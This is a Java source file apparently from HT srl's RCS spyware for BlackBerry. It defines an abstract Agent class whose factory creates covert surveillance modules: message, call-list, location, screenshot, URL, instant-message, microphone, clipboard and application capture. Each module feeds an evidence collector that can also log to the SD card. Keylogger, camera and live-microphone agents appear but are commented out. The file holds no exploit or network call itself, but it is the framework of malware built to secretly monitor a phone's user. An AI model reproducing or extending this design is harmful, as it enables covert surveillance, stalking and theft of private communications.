//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Agent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.agent;

import blackberry.Status;
import blackberry.config.Conf;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceCollector;
import blackberry.threadpool.TimerJob;

/**
 * The Class Agent.
 */
public abstract class Agent extends TimerJob {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Agent", DebugLevel.VERBOSE);
    //#endif

    public static final int AGENT = 0x1000;
    public static final int AGENT_INFO = AGENT;
    public static final int AGENT_MESSAGE = AGENT + 0x1;
    public static final int AGENT_TASK = AGENT + 0x2;
    public static final int AGENT_CALLLIST = AGENT + 0x3;
    public static final int AGENT_DEVICE = AGENT + 0x4;
    public static final int AGENT_POSITION = AGENT + 0x5;
    public static final int AGENT_CALL = AGENT + 0x6;
    public static final int AGENT_CALL_LOCAL = AGENT + 0x7;
    public static final int AGENT_KEYLOG = AGENT + 0x8;
    public static final int AGENT_SNAPSHOT = AGENT + 0x9;
    public static final int AGENT_URL = AGENT + 0xa;
    public static final int AGENT_IM = AGENT + 0xb; // 4107
    // public static final int AGENT_EMAIL = AGENT + 0xc;
    public static final int AGENT_MIC = AGENT + 0xd;
    public static final int AGENT_CAM = AGENT + 0xe;
    public static final int AGENT_CLIPBOARD = AGENT + 0xf;
    public static final int AGENT_CRISIS = AGENT + 0x10;
    public static final int AGENT_APPLICATION = AGENT + 0x11;
    public static final int AGENT_LIVE_MIC = AGENT + 0x12;
    public static final int AGENT_PDA = 0xDF7A;

    public static final int AGENT_ENABLED = 0x2;

    /**
     * Factory.
     * 
     * @param agentId
     *            the agent id
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     * @return the agent
     */
    public static Agent factory(final int agentId, final boolean agentStatus,
            final byte[] confParams) {

        //#ifdef DBC
        Check.requires(confParams != null, "factory: confParams != null");
        //#endif

        switch (agentId) {
            case AGENT_MESSAGE:
                //#ifdef DEBUG
                debug.trace("Factory *** AGENT_MESSAGE "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                return new MessageAgent(agentStatus, confParams);
            case AGENT_TASK:
                //#ifdef DEBUG
                debug.trace("Factory *** AGENT_TASK "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                return new TaskAgent(agentStatus, confParams);
            case AGENT_CALLLIST:
                //#ifdef DEBUG
                debug.trace("Factory *** AGENT_CALLLIST "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                return new CallListAgent(agentStatus, confParams);
            case AGENT_DEVICE:
                //#ifdef DEBUG
                debug.trace("Factory *** AGENT_DEVICE "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                ;
                //#endif
                return new DeviceInfoAgent(agentStatus, confParams);
            case AGENT_POSITION:
                //#ifdef DEBUG
                debug.trace("Factory *** AGENT_POSITION "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                return new PositionAgent(agentStatus, confParams);
            case AGENT_CALL:
                //#ifdef DEBUG
                debug.trace("NULL Factory *** AGENT_CALL "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                //return new CallAgent(agentStatus, confParams);
                return null;
            case AGENT_CALL_LOCAL:
                //#ifdef DEBUG
                debug.trace("NULL Factory *** AGENT_CALL_LOCAL "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                //return new CallLocalAgent(agentStatus, confParams);
                return null;
            case AGENT_KEYLOG:
                //#ifdef DEBUG
                debug.trace("NULL Factory *** AGENT_KEYLOG "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                //return new KeyLogAgent(agentStatus, confParams);
                return null;
            case AGENT_SNAPSHOT:
                //#ifdef DEBUG
                debug.trace("Factory *** AGENT_SNAPSHOT "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                return new SnapShotAgent(agentStatus, confParams);
            case AGENT_URL:
                //#ifdef DEBUG
                debug.trace("Factory *** AGENT_URL "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                return new UrlAgent(agentStatus, confParams);
            case AGENT_IM:
                //#ifdef DEBUG
                debug.trace("Factory *** AGENT_IM "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                return new ImAgent(agentStatus, confParams);
            case AGENT_MIC:
                //#ifdef DEBUG
                debug.trace("Factory *** AGENT_MIC "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                return new MicAgent(agentStatus, confParams);
            case AGENT_CAM:
                //#ifdef DEBUG
                debug.trace("NULL Factory *** AGENT_CAM "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                //return new CamAgent(agentStatus, confParams);
                return null;
            case AGENT_CLIPBOARD:
                //#ifdef DEBUG
                debug.trace("Factory *** AGENT_CLIPBOARD "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                return new ClipBoardAgent(agentStatus, confParams);
            case AGENT_CRISIS:
                //#ifdef DEBUG
                debug.trace("Factory *** AGENT_CRISIS "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                return new CrisisAgent(agentStatus, confParams);
            case AGENT_APPLICATION:
                //#ifdef DEBUG
                debug.trace("Factory *** AGENT_APPLICATION "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                return new ApplicationAgent(agentStatus, confParams);
            case AGENT_PDA:
                //#ifdef DEBUG
                debug.trace("NULL Factory *** AGENT_PDA "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif
                //return new PdaAgent(agentStatus, confParams);
                return null;
            case AGENT_LIVE_MIC:
                //#ifdef DEBUG
                debug.trace("NULL Factory *** AGENT_LIVE_MIC "
                        + (agentStatus ? "enabled" : "disabled") + " ***");
                //#endif			
                //return new LiveMicAgent(agentStatus, confParams);
                return null;
            default:
                //#ifdef DEBUG
                debug.trace("AgentId UNKNOWN: " + agentId);
                //#endif
                return null;
        }
    }

    Status status;

    EvidenceCollector logCollector;

    boolean logOnSD;
    public int agentId;

    // public int agentStatus;

    // public int command;

    protected Evidence evidence;
    //protected Object evidenceLock = new Object();

    /**
     * Instantiates a new agent.
     * 
     * @param agentId_
     *            the agent id_
     * @param agentEnabled
     *            the agent enabled
     * @param logOnSD_
     *            the log on s d_
     * @param name
     *            the name
     */
    protected Agent(final int agentId_, final boolean agentEnabled,
            final boolean logOnSD_, final String name) {
        super(name);
        status = Status.getInstance();
        logCollector = EvidenceCollector.getInstance();

        agentId = agentId_;

        logOnSD = logOnSD_;
        evidence = logCollector.factory(this, logOnSD_ && Conf.SD_ENABLED);

        enable(agentEnabled);
    }

    public void init(final boolean agentEnabled, final byte[] confParams) {
        parse(confParams);
        enable(agentEnabled);
    }

    /**
     * On sd.
     * 
     * @return true, if successful
     */
    public final boolean onSD() {
        return logOnSD;
    }

    /**
     * Parses the.
     * 
     * @param confParameters
     *            the conf parameters
     * @return true, if successful
     */
    protected abstract boolean parse(byte[] confParameters);

    //#ifdef DEBUG
    public final String toString() {
        return "Agent " + name + "|" + agentId;

    }
    //#endif
}
